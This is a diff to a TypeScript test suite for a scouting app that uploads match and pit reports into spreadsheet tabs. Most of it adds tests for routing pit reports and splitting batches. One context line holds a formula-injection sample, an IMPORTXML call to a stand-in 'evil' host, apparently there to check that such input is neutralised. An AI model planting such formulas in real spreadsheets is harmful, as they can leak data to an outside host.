@@ -422,13 +422,30 @@ describe('uploading Reports', () => {
     expect(matchRows()[0].notes).toBe(`'=IMPORTXML("http://evil", "//a")`);
   });
 
-  it('routes Pit Reports to the Pit Reports tab', () => {
+  function pitReport(overrides: Partial<PitReport> = {}): PitReport {
     const { matchNumber: _m, station: _s, ...base } = matchReport({ id: 'p1', teamNumber: 1511 });
-    const pit: PitReport = { ...base, kind: 'pit' };
+    return { ...base, kind: 'pit', answers: { drive: 'Swerve', motors: 4 }, ...overrides };
+  }
 
-    upload(pit);
+  it('routes Pit Reports to the Pit Reports tab, with blank match and Station', () => {
+    expect(upload(pitReport())).toEqual([{ reportId: 'p1', outcome: 'stored' }]);
 
-    expect(port.rows(EVENT_SHEET, REPORT_TABS.pit)).toMatchObject([{ 'Report ID': 'p1', Kind: 'pit', Match: '', Team: 1511 }]);
+    expect(port.rows(EVENT_SHEET, REPORT_TABS.pit)).toEqual([
+      expect.objectContaining({ 'Report ID': 'p1', Kind: 'pit', Match: '', Station: '', Team: 1511, drive: 'Swerve', motors: 4 }),
+    ]);
+    expect(port.readEventTab(EVENT_SHEET, REPORT_TABS.pit)[0]).toEqual([...METADATA_COLUMNS, 'drive', 'motors']);
+  });
+
+  it('splits one batch between the Match Reports and Pit Reports tabs', () => {
+    const outcomes = upload(matchReport({ id: 'r1' }), pitReport({ id: 'p1' }), pitReport({ id: 'p2', teamNumber: 174 }));
+
+    expect(outcomes.map((o) => o.outcome)).toEqual(['stored', 'stored', 'stored']);
+    expect(matchRows().map((r) => r['Report ID'])).toEqual(['r1']);
+    expect(port.rows(EVENT_SHEET, REPORT_TABS.pit).map((r) => [r['Report ID'], r.Team])).toEqual([
+      ['p1', 1511],
+      ['p2', 174],
+    ]);
+    expect(matchRows()[0]).not.toHaveProperty('drive');
   });
 
   it('rejects a Report for an unknown event, and still stores the rest', () => {
